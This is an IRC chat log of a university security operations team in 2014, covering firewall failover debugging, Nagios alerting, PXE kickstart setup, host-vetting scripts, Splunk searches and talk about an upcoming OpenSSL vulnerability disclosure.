2014-05-30 08:47:41	eyrich	it seems it is something related to the carp addresses for the ESX net, maybe also domain net.
2014-05-30 08:47:55	eyrich	stuff is working from sec pub to sec priv
2014-05-30 08:48:23	eyrich	i cant even ping the carp ip from the same lan
2014-05-30 08:48:35	jazoff	arp entries?
2014-05-30 08:51:46	eyrich	i have them on the client machine
2014-05-30 08:51:55	eyrich	looking to see if it matches the pfs carp
2014-05-30 08:53:56	wraquel	Anyone want to do the blue waters review instead of me?
2014-05-30 08:55:19	eyrich	its just the damn esx net, domain net is working too
2014-05-30 08:55:40	wraquel	Or compol
2014-05-30 08:55:48	wraquel	anyone.... bueller?.... Bueller?....
2014-05-30 08:55:54	eyrich	kind of tied up
2014-05-30 08:55:56	eyrich	stuff broke
2014-05-30 08:56:01	wraquel	likely story.
2014-05-30 08:56:08	wraquel	pfff... fine.
2014-05-30 08:56:08	eyrich	check you email :)
2014-05-30 08:56:23	eyrich	i can go to compol
2014-05-30 08:56:32	wraquel	Nah, I got it.
2014-05-30 08:56:45	wraquel	I eschew meetings. BW is starts right after compol and goes to 4.
2014-05-30 08:56:47	eyrich	ok, 
2014-05-30 08:57:19	wraquel	so... there pretty much goes my day
2014-05-30 08:58:52	wraquel	So, answer this at least. If TACC (chuckle) were to ask us what we did well for BW security over the last year, how would you respond?
2014-05-30 08:59:05	wraquel	Need to fill out this preso. Only have like 2 slides.
2014-05-30 09:03:45	wraquel	holy crap. doug cut the locks.
2014-05-30 09:03:54	wraquel	(his hair)
2014-05-30 09:04:54	eyrich	be working in a minute - pretty sure I found the issue
2014-05-30 09:05:07	wraquel	Jeanette on Lync?
2014-05-30 09:06:07	eyrich	she is going to fire up now
2014-05-30 09:13:51	wraquel	eyrich: if BroCon were in Boston, would you go? And on top of that would stay a few extra days to go around and photowalk?
2014-05-30 09:14:51	eyrich	not sure - it would be fun. travel is just tough for me, my wife HATES it when I travel
2014-05-30 09:15:16	wraquel	BOSTON!
2014-05-30 09:15:32	eyrich	stuff should start coming back up now
2014-05-30 09:15:49	eyrich	it was never down - everything on the ESX network was un reachable
2014-05-30 09:16:22	wraquel	Lobster rolls, pubs, early morning shots of crews on the Charles.
2014-05-30 09:16:34	wraquel	So what did you fix?
2014-05-30 09:17:01	eyrich	the pfsense 2nd cluster member was on a vswitch that did not allow promisc mode
2014-05-30 09:17:14	eyrich	only for the ESX net
2014-05-30 09:17:28	wraquel	lesson learned.
2014-05-30 09:17:41	eyrich	yep
2014-05-30 09:27:11	eyrich	should I have seen things in the nagios channel?
2014-05-30 09:28:56	jazoff	yes
2014-05-30 09:29:01	jazoff	oh, hmm
2014-05-30 09:29:07	jazoff	just got all the emails
2014-05-30 09:29:14	eyrich	ya and nothing in the channel
2014-05-30 09:29:18	jazoff	i mean, it did log all the
2014-05-30 09:29:19	jazoff	08:23 < ncsabot> [nagios-sec] PROBLEM Host Alert: vcenter-node01 (10.142.156.11) is DOWN: PING CRITICAL - Packet loss = 100%
2014-05-30 09:29:22	jazoff	08:23 < ncsabot> [nagios-sec] PROBLEM Host Alert: vsa-cluster (10.142.156.51) is DOWN: PING CRITICAL - Packet loss = 100%
2014-05-30 09:29:25	jazoff	etc
2014-05-30 09:29:36	eyrich	right - but no ups?
2014-05-30 09:30:02	eyrich	anyway - im going to shut down the primary again to make sure it works correctley this time
2014-05-30 09:30:12	jazoff	not to irc at least... keist ?
2014-05-30 09:30:27	jazoff	oh, i see
2014-05-30 09:30:48	jazoff	[Fri May 30 2014 09:25:34 GMT-0500 (CDT)] INFO Message '[nagios2-sec] RECOVERY Host Alert: vsa-0-management (10.142.156.64) is UP: PING OK - Packet loss = 40%, RTA = 0.80 ms' received for room #nagios-test
2014-05-30 09:31:15	jazoff	though I also see
2014-05-30 09:31:15	jazoff	[Fri May 30 2014 09:25:58 GMT-0500 (CDT)] INFO Message '[nagios-sec] RECOVERY Host Alert: sec-pfs-esx (10.142.148.126) is UP: PING OK - Packet loss = 0%, RTA = 0.28 ms' received for room #nagios
2014-05-30 09:31:25	jazoff	not sure why that didn't show up
2014-05-30 09:31:50	jazoff	I'm not saying you broke it, but everything was working until you joined the channel.. :)
2014-05-30 09:32:18	eyrich	hah
2014-05-30 09:32:47	jazoff	hmm, something just broke
2014-05-30 09:33:02	eyrich	primary cluster is off 
2014-05-30 09:33:11	jazoff	that'll do it
2014-05-30 09:33:29	eyrich	what broke, Im not seeing errors
2014-05-30 09:33:44	eyrich	everything seems to be working
2014-05-30 09:33:48	jazoff	dns on bro-dev at least
2014-05-30 09:34:13	jazoff	can't ping 141.142.2.2
2014-05-30 09:34:34	eyrich	what gateway is set?
2014-05-30 09:34:43	jazoff	10.142.148.1
2014-05-30 09:34:55	jazoff	no arp entry for that
2014-05-30 09:35:15	eyrich	well crap
2014-05-30 09:35:18	eyrich	im looking
2014-05-30 09:35:33	eyrich	i did not loose esx access this time
2014-05-30 09:37:28	eyrich	cant ping the actuall ip of fw member either
2014-05-30 09:37:57	eyrich	ok i ill bring up other member and work on this
2014-05-30 09:38:07	eyrich	weird that it didnt break last time
2014-05-30 09:39:30	eyrich	should be back now
2014-05-30 09:39:45	jazoff	wrote a oneliner to post in here when it works agian
2014-05-30 09:40:27	jazoff	oh, the bot timed out before
2014-05-30 09:40:29	jazoff	that'll mess things up
2014-05-30 09:40:48	jazoff	so yeah, works again
2014-05-30 09:40:50	jazoff	need to poke bot
2014-05-30 09:41:19	ncsabot	bro-dev ok now :-)
2014-05-30 09:41:27	jazoff	that's better :)
2014-05-30 09:43:30	eyrich	looks like all the dinking around pissed off the sec-prv interface on the seconf cluster member
2014-05-30 09:43:39	eyrich	a reboot fixed it
2014-05-30 09:43:43	eyrich	im going to test again
2014-05-30 09:44:55	eyrich	here it goes
2014-05-30 09:45:54	eyrich	down now
2014-05-30 09:46:07	jazoff	looks ok
2014-05-30 09:46:39	eyrich	yay
2014-05-30 09:58:53	eyrich	ok, im firing the primary back up - yay
2014-05-30 11:40:37	soehlert	jazoff: looks like ncsabot can't post to #jira
2014-05-30 11:44:10	jazoff	oh, the ticket thing...
2014-05-30 11:44:13	jazoff	lemme start that back up for now
2014-05-30 11:44:18	soehlert	ok
2014-05-30 11:45:19	jazoff	ok, running
2014-05-30 11:45:29	jazoff	need to have puppet deploy/start it properly
2014-05-30 11:45:50	soehlert	ahh so no "problem" just not autostarting?
2014-05-30 11:46:40	jazoff	yeah
2014-05-30 11:47:09	wraquel	Do we need nagios checks to see if ncsabot is running?
2014-05-30 11:47:14	wraquel	Maybe a noop on irs?
2014-05-30 11:47:15	wraquel	ir
2014-05-30 11:47:16	wraquel	c
2014-05-30 11:47:17	wraquel	ug
2014-05-30 11:47:37	jazoff	no.. kinda tricky to test if it is running AND working
2014-05-30 12:19:19	soehlert	sweet nagios dashboard now projected on our wall
2014-05-30 12:37:30	wraquel	you have a projector?
2014-05-30 12:37:39	soehlert	ya grabbed an old one from surplus
2014-05-30 12:37:44	wraquel	sweet
2014-05-30 12:38:02	soehlert	turns out thruk can do nagios dashboards so now we got one up there
2014-05-30 12:38:05	wraquel	Do you prefer the projector or would you prefer a TV?
2014-05-30 12:38:30	soehlert	well if we could hang a tv on the wall i guess that'd be better since it owuldnt be so loud..but i want something in my office on the blank wall 
2014-05-30 12:38:46	wraquel	Add more visualizations and I can justify a TV for your wall.
2014-05-30 12:38:58	soehlert	more visualizations?
2014-05-30 12:39:09	soehlert	and ya i jsut did this for now cuz its free and the world cup starts soon :)
2014-05-30 12:39:17	wraquel	lulz
2014-05-30 12:40:09	wraquel	"Hey adam, Sam and Jon have come up with a good dashboard that covers X and Y and Z. Let's get them a big-ass tv to mount."
2014-05-30 12:40:12	soehlert	whaddya mean more visualizations though?
2014-05-30 12:40:25	wraquel	Well, more dashboard info.
2014-05-30 12:40:33	jazoff	does thruk have an api?
2014-05-30 12:40:35	soehlert	such as?
2014-05-30 12:40:35	soehlert	tickets?
2014-05-30 12:40:42	wraquel	Tickets is a good start.
2014-05-30 12:40:51	wraquel	Maybe important munin graphs or something.
2014-05-30 12:41:12	soehlert	well theres no space to add anything now. id have to flip through tabs...
2014-05-30 12:41:17	soehlert	i guess if we had a nice big tv that would work
2014-05-30 12:41:18	wraquel	I'm sure we can come up with things. well, either way, it's a start, I'll go ahead and ask and see what he says.
2014-05-30 12:41:28	wraquel	Right. More res, more info.
2014-05-30 12:41:49	soehlert	jazoff: it seems like there is a "Livestatus" API, but that may be to talk to nagios, unsure as its worded strangely
2014-05-30 12:44:04	jazoff	yeah, looking for more of an http json api
2014-05-30 12:44:37	soehlert	thats what i was guessing. though to incorporate munin and/or tickets im sure we couldn't use thruk anyways
2014-05-30 12:45:26	jazoff	you can get a FF extension that will cycle through tabs
2014-05-30 12:45:40	soehlert	jazoff: ya...i guess worst case thats an option..
2014-05-30 12:57:33	wraquel	soehlert: you see any issues with pushing logs to phuong via scp?
2014-05-30 12:58:40	soehlert	nah i think keist was already figuring that out
2014-05-30 12:59:18	jazoff	basically just a copy of the script I wrote for rsyncing to nfs
2014-05-30 12:59:51	soehlert	yup
2014-05-30 13:00:04	soehlert	keist was dealing with phuong on getting the keys set up and all that
2014-05-30 13:01:25	wraquel	ok. good
2014-05-30 14:17:10	keist	 _______ 
2014-05-30 14:17:11	keist	< hello >
2014-05-30 14:17:11	keist	 ------- 
2014-05-30 14:17:11	keist	        \   ^__^
2014-05-30 14:17:11	keist	         \  (oo)\_______
2014-05-30 14:17:12	keist	            (__)\       )\/\
2014-05-30 14:17:14	keist	                ||----w |
2014-05-30 14:17:20	jazoff	cowsay?
2014-05-30 14:17:24	keist	:)
2014-05-30 14:18:31	keist	I'm going to puppetize it, all our scripts should provide error handling with cowsay :)
2014-05-30 14:19:13	wraquel	Adam says yes on the TV. but only out in the common area, not in your room. 
2014-05-30 14:19:30	soehlert	ya thats what he said before. hence why i grabbed the projector for the office
2014-05-30 14:22:33	keist	yay!
2014-05-30 14:22:41	soehlert	?
2014-05-30 14:24:04	wraquel	  ___
2014-05-30 14:24:05	wraquel	< yay >
2014-05-30 14:24:05	wraquel	  ---
2014-05-30 14:24:05	wraquel	         \   ^__^ 
2014-05-30 14:24:05	wraquel	          \  (oo)\_______
2014-05-30 14:24:06	wraquel	             (__)\       )\/\
2014-05-30 14:24:09	wraquel	                 ||----w |
2014-05-30 14:24:11	wraquel	                 ||     ||
2014-05-30 14:25:10	keist	LOL
2014-05-30 14:27:36	soehlert	keist: i think nagios has some routes issues
2014-05-30 15:27:50	keist	nah, it was due to the firewall. I added a rule allowing HTTPS from nagios and it works now.
2014-05-30 16:06:57	wraquel	Is there a 'current' log folder on seclogs, or is it just YYYY/MM/DD/host_YYYYMDDHH.log?
2014-05-30 16:07:37	soehlert	just that
2014-05-30 16:07:55	wraquel	k
2014-06-02 09:07:32	jazoff	keist: looks like those changes to rsyslog really helped
2014-06-02 11:20:15	soehlert	lunch today anyone?
2014-06-02 11:26:27	jazoff	I like lunch everyday :)
2014-06-02 11:26:40	soehlert	It's actually my favorite meal of the day
2014-06-02 11:27:14	jazoff	I tend to make breakfast for lunch though
2014-06-02 11:27:20	jazoff	too tired to make breakfast for breakfast
2014-06-02 11:35:21	soehlert	haha been there done that
2014-06-02 15:05:11	jazoff	eyrich: updated dumbno to use features in the newer eos.. working great so far
2014-06-02 15:05:23	jazoff	especially with the change from https to http, which probably has more to do with it :)
2014-06-02 15:11:19	wraquel	What new features are there?
2014-06-02 15:12:02	jazoff	the api supports the 'show ip access-lists' command
2014-06-02 15:12:17	jazoff	before you had to run it in text mode and parse the output yourself
2014-06-02 15:12:34	wraquel	nice
2014-06-02 15:16:25	wraquel	So. It IS $80 a license. Don't need the site license, but apparently we're limited to only being able to get about 5 licenses max.
2014-06-02 15:16:37	soehlert	why the limit?
2014-06-02 15:17:01	wraquel	I don't know. I think it's because we'd have to register as a site first.
2014-06-02 15:17:19	soehlert	ah ok. well can we do that? that would be a huuuuuge help if we could even do it for the bastions only
2014-06-02 15:17:41	jazoff	it?
2014-06-02 15:18:12	soehlert	rhel licenses
2014-06-02 15:18:28	wraquel	Ok, so get 5?
2014-06-02 15:18:55	jazoff	ah
2014-06-02 15:18:58	soehlert	sure i'll take 5. bwbh1/bwbh2 cerberus0/cerberus4 and i'm sure we can figure out which is next important
2014-06-02 15:19:12	soehlert	this will buy me time to finish puppetizing the bastions first without them getting out of support
2014-06-02 16:02:18	soehlert	ok i'm confused. i have this in dhcpd.conf: range 10.142.148.90 10.142.148.100
2014-06-02 16:02:18	soehlert	yet my kickstart test host keeps getting 10.142.148.78
2014-06-02 16:19:31	jazoff	hmm
2014-06-02 16:19:34	jazoff	restarted dhcpd?
2014-06-02 16:19:47	soehlert	ya
2014-06-02 16:19:53	jazoff	if you run tcpdump on the dhcp server is it definitely getting the lease from you?
2014-06-02 16:20:00	jazoff	(or I suppose look at the log on the dhcp server)
2014-06-02 16:20:11	soehlert	ya
2014-06-02 16:20:35	soehlert	although now im confused. it says: "Client IP 10.142.148.91" and "DHCP IP: 10.142.148.78"
2014-06-02 16:20:44	soehlert	dhcp server is at 10.142.148.72
2014-06-02 16:20:51	soehlert	nvm its not
2014-06-02 16:21:24	soehlert	so that part actually seems to be working whoops
2014-06-02 16:21:34	 *	jazoff fixed it
2014-06-02 16:21:43	soehlert	youre on fire with the not doing anything fixes
2014-06-02 16:21:54	soehlert	now if you could just fix my arp timeout..
2014-06-02 16:22:10	jazoff	arp timeout?
2014-06-02 16:22:21	jazoff	does a port not have spanning tree portfast enabled?
2014-06-02 16:22:36	soehlert	ya this host im trying to kickstart gets that ip and then PXE-E11: ARP timeout
2014-06-02 16:23:38	jazoff	hmmmm
2014-06-02 16:23:43	jazoff	you setting next-server properly?
2014-06-02 16:24:03	soehlert	haha nope. thats getting set as .72...
2014-06-02 16:29:15	jazoff	:)
2014-06-02 16:29:56	soehlert	mashed up the public and private ips...whoops. on the plus side, my templating is working well so there's that at least.
2014-06-02 16:30:13	jazoff	ah yeah, that was my next guess, subnet mismatch
2014-06-02 16:30:24	jazoff	since even the wrong IP on the same subnet shouldn't cause an arp timeout
2014-06-02 16:30:43	soehlert	i was on the right subnet just using .72 as the next address (which is the last octet from the public ip)
2014-06-02 17:08:31	soehlert	woo kickstart works. gonna add a couple more small things but then we can turn off blocker
2014-06-02 17:10:56	wraquel	ever since the update, irssi has chat lines from one channel overwriting lines in other channels. Sigh... might be time to switch...
2014-06-02 17:14:55	jazoff	:)
2014-06-03 12:38:54	jazoff	eyrich: I think the https issue may have been causing some of the dropped updates from bro..
2014-06-03 12:38:59	jazoff	things are working REALLY well now
2014-06-03 12:43:13	soehlert	anyone seen this before? https://bitbucket.org/LaNMaSteR53/recon-ng/overview
2014-06-03 12:43:13	soehlert	seems pretty cool. basically metasploit but for recon
2014-06-03 12:47:37	jazoff	seems kinda like by ninfo project
2014-06-03 12:59:33	jazoff	is dnsworks the new neteng system or the old system?
2014-06-03 13:03:13	jazoff	soehlert: what do you think we should do next for vetting?
2014-06-03 13:28:17	eyrich	jazoff: re https - do you want to gather soem data and submit to the guy we have been working with
2014-06-03 13:28:38	jazoff	I don't really have data.. and it's tricky to collect some
2014-06-03 13:28:44	jazoff	you can't enable http and https at the same time
2014-06-03 13:29:39	jazoff	semes it just hangs or takes a while in ssl handshake occasionally 
2014-06-03 13:54:24	soehlert	jazoff: dnsworks is the old system
2014-06-03 13:54:24	soehlert	as for vetting...wasnt there a section or two you hadn't coded up yet?
2014-06-03 13:54:39	jazoff	I did those.. I thought
2014-06-03 13:54:59	jazoff	that was the mounts and netstat stuff which is done
2014-06-03 13:55:55	soehlert	oh then are you assuming im going to be adding in requirements? :)
2014-06-03 13:56:49	jazoff	i dunno
2014-06-03 13:56:53	jazoff	just forgot where we left off
2014-06-03 13:57:21	soehlert	well i think we got that page pretty much set. the only stuff that remains is mostly on me, getting it run on all machines via cron and all taht
2014-06-03 13:57:39	soehlert	oh actually. we had originally talked about a way to compare to the last output. is that possible?
2014-06-03 13:58:21	jazoff	ah yeah, lemme look into that
2014-06-03 13:58:28	jazoff	can definitely pull down the report using the api
2014-06-03 13:58:54	soehlert	cool then we can set something up for wardog so he can pull them from his laptop when theres a new one if he wants
2014-06-03 14:02:20	jazoff	hmm, so compare is easy.. but it would also need an update mode?
2014-06-03 14:02:48	soehlert	if possible i think so. i think whats presented on the page should be the latest info with some way to see the changes from the last run
2014-06-03 14:03:01	jazoff	oooooo
2014-06-03 14:03:06	jazoff	that's tricky
2014-06-03 14:03:23	soehlert	does django do a history?
2014-06-03 14:03:39	soehlert	i feel like i saw "view history" somewher
2014-06-03 14:04:07	soehlert	ya i suppose we can just check that if we have to if that makes life easier
2014-06-03 14:04:59	jazoff	not sure if the api updates the django admin history
2014-06-03 14:05:09	jazoff	this is where it would be really easy to just use a wiki for this :)
2014-06-03 14:05:37	jazoff	not as fancy search/filtering options, but makes updating/history easy since you are just storing a text blob
2014-06-03 14:05:58	jazoff	wiki, or a git repo I suppose
2014-06-03 14:06:04	soehlert	well the api doesnt need to necessarily right? when looking at the vetting page for a host you can just hit history. that will still work right?
2014-06-03 14:06:04	soehlert	or is the updating part hte hard part?
2014-06-03 14:06:53	jazoff	yeah.. django-rest-framework doesn't update that history apparently
2014-06-03 14:07:05	soehlert	ahh
2014-06-03 14:10:39	jazoff	now I'm starting to think that the wiki would be easier
2014-06-03 14:10:59	jazoff	though the last time I built something against confluence they removed wiki markup and fucked me over
2014-06-03 14:11:00	soehlert	can we post to a wiki in the same manner?
2014-06-03 14:11:10	soehlert	well what about against moinmoin?
2014-06-03 14:11:32	soehlert	or what about the git repo idea?
2014-06-03 14:11:47	jazoff	yeah, that kind of thing would be really easy
2014-06-03 14:11:58	jazoff	since diff and history are just git commands
2014-06-03 14:12:01	jazoff	can push to git-sec
2014-06-03 14:12:01	soehlert	ya
2014-06-03 14:12:12	jazoff	could go back to the simpler vetting.sh that just outputs the txt report...
2014-06-03 14:12:15	soehlert	how would we do autmated git-push
2014-06-03 14:12:50	jazoff	could rsycn the reports from monsoon
2014-06-03 14:13:10	jazoff	or just add an ssh key on monsoon for a git account that only has access to the vetting repo
2014-06-03 14:13:37	soehlert	ok so its not difficult is the main thing.
2014-06-03 14:13:40	jazoff	wouldn't have a fancy search api or really structured data, but everything else would get easier
2014-06-03 14:13:58	soehlert	well the data would be as structured as we make it in the output file right?
2014-06-03 14:14:03	jazoff	yeah
2014-06-03 14:14:14	jazoff	technically we could dump the output as yaml or something
2014-06-03 14:16:22	soehlert	what would that get us?
2014-06-03 14:17:26	jazoff	structured data that is kinda easy to read
2014-06-03 14:17:45	jazoff	like hiera has
2014-06-03 14:17:47	soehlert	fair enough. can you dump bash into yaml?
2014-06-03 14:17:54	jazoff	dont think so
2014-06-03 14:18:06	soehlert	well then how would we do it?
2014-06-03 14:19:58	jazoff	same as we are now with the python parser
2014-06-03 14:20:03	soehlert	ah ok
2014-06-03 14:20:04	jazoff	>>> print yaml.dump(out)
2014-06-03 14:20:05	jazoff	date: '2014-05-27'
2014-06-03 14:20:05	jazoff	host: subzero
2014-06-03 14:20:05	jazoff	ip: [10.0.1.1, 141.142.148.41]
2014-06-03 14:20:05	jazoff	ipforwarding: false
2014-06-03 14:20:12	soehlert	ok ya i like that idea
2014-06-03 14:20:17	jazoff	the big text blobs don't look so good
2014-06-03 14:20:25	soehlert	ahh i wouldnt imagine
2014-06-03 14:20:28	jazoff	but services would be like
2014-06-03 14:20:28	jazoff	services:
2014-06-03 14:20:28	jazoff	- {port: 22, protocol: tcp, service: sshd}
2014-06-03 14:20:28	jazoff	- {port: 111, protocol: tcp, service: rpcbind}
2014-06-03 14:20:31	jazoff	- {port: 4243, protocol: tcp, service: java}
2014-06-03 14:53:58	soehlert	so go back to the output we had before?
2014-06-03 15:00:38	jazoff	mayyybe :)
2014-06-03 15:00:50	jazoff	might help to talk about the longer term plans for this
2014-06-03 15:00:50	soehlert	ooookedoke
2014-06-03 15:01:01	jazoff	i didn't think of the whole history aspect much
2014-06-03 15:03:07	soehlert	its cool
2014-06-03 15:31:43	eyrich	are supposed to be getting taub logs?
2014-06-03 15:31:49	eyrich	I thought that all got shut off
2014-06-03 15:49:39	jazoff	grr
2014-06-03 15:50:00	jazoff	wondered what the dog was doing, she found what looked like a very long dead squirrel and was chewing on it
2014-06-03 15:50:20	soehlert	yayyy
2014-06-03 15:56:49	wraquel	yeah, we still get taub logs.
2014-06-03 16:38:23	wraquel	jazoff: anything exciting to do in Atlanta?
2014-06-03 16:38:37	wraquel	Other than chewing on dead squirrels
2014-06-03 16:38:39	soehlert	ive run through the airport before
2014-06-03 16:39:42	jazoff	ummm
2014-06-03 16:40:05	jazoff	wraquel: when?
2014-06-03 16:49:30	jazoff	there's lots of concerts around here and plays
2014-06-03 16:51:58	wraquel	July 13-18th
2014-06-03 16:52:03	wraquel	XSEDE 14 is down there.
2014-06-03 16:52:12	wraquel	Jon and I are considering going.
2014-06-03 16:52:24	jazoff	ah, right
2014-06-03 16:52:42	wraquel	Apparently we also get discounts for the aquarium.
2014-06-03 16:52:42	jazoff	adam mentioned I could maybe go to that, but there doesn't seem to be much of a point aside from maybe networking
2014-06-03 16:52:52	wraquel	Yeah.
2014-06-03 16:53:00	wraquel	If anything come to the staff meetings on the last day.
2014-06-03 16:53:11	wraquel	Network with some of the other security teams.
2014-06-03 16:53:24	jazoff	i think I can just grab the marta into downtown
2014-06-03 16:53:33	wraquel	It's at the marquis
2014-06-03 16:53:37	wraquel	There's a stop at the hotel apparently.
2014-06-03 16:55:12	jazoff	yeah, 2 blocks away
2014-06-04 10:19:18	soehlert	anyone else catch this? "Jun  4 10:13:51 h2ologin1 sudo:   tra057 : pam_authenticate: User not known to the underlying authentication module ; TTY=pts/38 ; PWD=/mnt/a/u/training/tra057/hdf5-working ; USER=root ; COMMAND=/bin/echo this is a test...i'm bored"
2014-06-04 10:27:35	jazoff	eek
2014-06-04 10:27:50	soehlert	jazoff: how do i ignore a subnet in splunk? im looking at what an IP has been up to, but a lot of it is to google's ord farm
2014-06-04 10:28:07	jazoff	AND NOT ....
2014-06-04 10:28:21	jazoff	you can do...
2014-06-04 10:28:31	jazoff	AND NOT id_resp_h=1.2.3.0/24 too
2014-06-04 10:28:36	jazoff	or just AND NOT id_resp_h=1.2.3
2014-06-04 10:30:42	soehlert	needed quotes around that and i could only get the cidr one to work, but that gets the job done gracias
2014-06-04 10:30:42	soehlert	in other news: "Empty csv lookup file (contains only a header) for table 'bhlist': /opt/splunk/etc/apps/search/lookups/bhlist.csv"
2014-06-04 10:45:20	jazoff	really?
2014-06-04 10:45:49	jazoff	i haven't updated that file in a while, no idea why it does that
2014-06-04 10:52:06	jazoff	lots of RDP scanning activity
2014-06-04 11:03:18	eyrich	why isnt it getting bhrd?
2014-06-04 11:09:28	jazoff	hmm
2014-06-04 11:09:38	jazoff	doesn't look like it is scanning, just pokin gone machine a lot
2014-06-04 11:13:38	eyrich	ah
2014-06-04 11:14:30	jazoff	66.162.93.202:18455 -> 141.142.226.60:3389 mostly
2014-06-04 11:55:44	eyrich	do we need to do a whip around today?
2014-06-04 12:00:28	soehlert	jazoff: we gotta change the link for nagios on the portal. it points to another groups nagios set up
2014-06-04 12:01:03	jazoff	oh? lol
2014-06-04 12:01:09	jazoff	you can just change it under /admin
2014-06-04 12:01:12	soehlert	ah ok
2014-06-04 12:01:35	soehlert	ya i was sitting here trying to log in and jschipp wasnt seeing the logs we were confused
2014-06-04 12:01:55	jazoff	hah
2014-06-04 12:31:02	eyrich	soehlert: do you have access to isc?
2014-06-04 12:31:21	soehlert	not that im aware of
2014-06-04 12:31:27	eyrich	ok
2014-06-04 12:32:05	eyrich	im not going to worry about the sql thing then - until joshi replies to my email or comes and talks to me. this looks like a sql misconfig on onside or the other to me.
2014-06-04 12:32:17	eyrich	also wasnt he suposed to be using ssl
2014-06-04 12:33:17	soehlert	i thought so
2014-06-04 12:33:27	soehlert	apparently he didnt set this stuff up though which is worrisome
2014-06-04 12:33:33	eyrich	jazoff: would suricatta have detected those error if they were ssl?
2014-06-04 12:33:42	eyrich	time for Adam to bring the hammer :)
2014-06-04 12:33:51	soehlert	thats what im thinking
2014-06-04 12:34:44	jazoff	hmm
2014-06-04 12:35:07	eyrich	in fact where did the data came from to generate those?
2014-06-04 12:35:31	jazoff	looks like the answer is "can't say"
2014-06-04 12:35:36	jazoff	if you telnet you get this back immediately:
2014-06-04 12:35:39	jazoff	Escape character is '^]'.
2014-06-04 12:35:39	jazoff	NHost 'fog.ncsa.illinois.edu' is not allowed to connect to this MySQL serverConnection closed by foreign host.
2014-06-04 12:35:51	eyrich	ok
2014-06-04 12:35:56	jazoff	so it possibly uses starttls after that
2014-06-04 12:36:02	eyrich	ok
2014-06-04 12:36:42	eyrich	although i thought mysql forced sll on the port, and woudnt let anything else
2014-06-04 12:37:20	eyrich	i m sure the problem is that he did nto adjust the allowed host IP to match the new uplink IPs for the new BW FW>
2014-06-04 12:37:21	jazoff	wow, that's trying to connect multiple times a second
2014-06-04 12:37:35	eyrich	ya - i see them in the state table
2014-06-04 12:38:05	jazoff	someone doesn't know what exponential backoff is
2014-06-04 12:39:01	eyrich	not sure if script or mysql
2014-06-04 12:39:23	soehlert	script i believe.
2014-06-04 12:39:28	jazoff	it's the script/program/whatever
2014-06-04 12:39:30	soehlert	you should see his crontab. its dirty
2014-06-04 12:39:45	soehlert	about 20 scripts doing shit all the time
2014-06-04 12:39:46	jazoff	the library would just throw an error and fail immediately
2014-06-04 12:43:09	eyrich	amzing that this has probably been broke since the bwfw migration - which was like a month ago
2014-06-04 12:43:27	soehlert	well suricata quickly showing its usefulness
2014-06-04 12:43:53	jazoff	heh, I wouldn't go that far :)
2014-06-04 12:44:06	soehlert	well nobody else caught it. so theres that
2014-06-04 12:44:20	jazoff	yeah
2014-06-04 12:44:47	soehlert	so basney got some word (and this needs to stay inside NCSA apparently) severe openssl vuln coming out tomorrow. linux vendors have patches
2014-06-04 12:45:08	jazoff	fun times
2014-06-04 12:45:18	wraquel	yep
2014-06-04 12:45:21	jazoff	be hilarious if libressl had already fixed it
2014-06-04 12:45:28	soehlert	hah that would be fun
2014-06-04 12:45:40	soehlert	i bet theyd get a lot of new users quickly if they did
2014-06-04 12:46:09	jazoff	i'm not sure if it has been ported to linux yet
2014-06-04 12:46:21	jazoff	openbsd developers use all the libc stuff that only openbsd has
2014-06-04 12:46:26	jazoff	the strlcpy stuff
2014-06-04 12:46:27	wraquel	Just heard, the news is going to break at 7pm tonight
2014-06-04 12:46:31	soehlert	ah right right
2014-06-04 12:46:40	soehlert	wraquel: do you know what it actually is?
2014-06-04 12:46:51	jazoff	any word of a PoC or way to scan for it?
2014-06-04 12:47:35	wraquel	Nope. The openssl team is being very tight lipped.
2014-06-04 12:47:36	wraquel	Sounds bad
2014-06-04 12:48:17	soehlert	want me to patch tonight if possible?
2014-06-04 12:49:32	wraquel	If it's remotely vulnerable, yes, if not, it can wait.
2014-06-04 12:49:45	soehlert	k. 
2014-06-04 12:49:52	soehlert	how sure are you on the 7pm announcement
2014-06-04 12:50:17	jazoff	7pm what time zone?
2014-06-04 12:50:18	wraquel	Not sure, just what Ive been tolf
2014-06-04 12:50:20	wraquel	told
2014-06-04 12:50:28	wraquel	I'm guessing eastern
2014-06-04 12:51:15	wraquel	maybe 00:00 UTC
2014-06-04 12:51:38	jazoff	http://www.openwall.com/lists/oss-security/2014/06/04/9
2014-06-04 12:52:21	jazoff	i've seen chkrootkit set off some false positive bro alerts for rootkit.. so probably a non zero number of systems have it installed
2014-06-04 12:52:46	soehlert	ya ive defintely seen people download it
2014-06-04 12:53:24	jazoff	heh, a chkrootkit splunk search found mostly inbound emails about the issue
2014-06-04 12:53:30	soehlert	nice
2014-06-04 12:53:31	jazoff	[SECURITY] [DSA 2945-1] chkrootkit security update' mail=<bounce-debian-security...
2014-06-04 12:56:32	jazoff	can't find anything about openssl on the interweb
2014-06-04 12:59:51	wraquel	nope. VERY tightlipped
2014-06-04 13:00:09	eyrich	we now it is openssl?
2014-06-04 13:00:19	eyrich	we know
2014-06-04 13:00:20	eyrich	?
2014-06-04 13:00:27	eyrich	and not gnutls - http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-3466
2014-06-04 13:00:35	wraquel	This was just updated: http://www.securityfocus.com/bid/66363?utm_source=dlvr.it&utm_medium=twitter
2014-06-04 13:00:40	wraquel	it's openssl
2014-06-04 13:01:11	wraquel	Not sure what was updated though.
2014-06-04 13:01:53	eyrich	no redhat listings
2014-06-04 13:02:28	jazoff	https://access.redhat.com/security/cve/CVE-2014-0076 ?
2014-06-04 13:02:43	jazoff	oh, not the same thing
2014-06-04 13:02:48	jazoff	or is it
2014-06-04 13:46:17	wraquel	Unless an exploit for that was actually found.
2014-06-04 13:47:09	soehlert	jazoff: instead of rewriting vetting.sh, can I just grab an old copy that would be closer to what we want? if so, whats the git command for that
2014-06-04 14:00:30	jazoff	try a git log -p vetting.sh
2014-06-04 14:01:34	jazoff	or just browse on git-sec
2014-06-04 14:02:53	jazoff	you can do like
2014-06-04 14:02:54	jazoff	git show 75cb64c03b5091de851cd7b2f801f0e3c2fe40e0:modules/vetting/files/vetting.sh
2014-06-04 14:03:05	jazoff	see http://stackoverflow.com/questions/338436/is-there-a-quick-git-command-to-see-an-old-version-of-a-file
2014-06-04 14:03:36	soehlert	danke
2014-06-04 14:07:00	jazoff	we doing the call?
2014-06-04 14:07:06	jazoff	or rather, I do call, you do meeting
2014-06-04 14:07:23	soehlert	i dont think so. no wardog, icepick is leaving/has left. jon and i are working on stuff
2014-06-04 14:17:52	wraquel	yeah, the whole call would be me coughing.
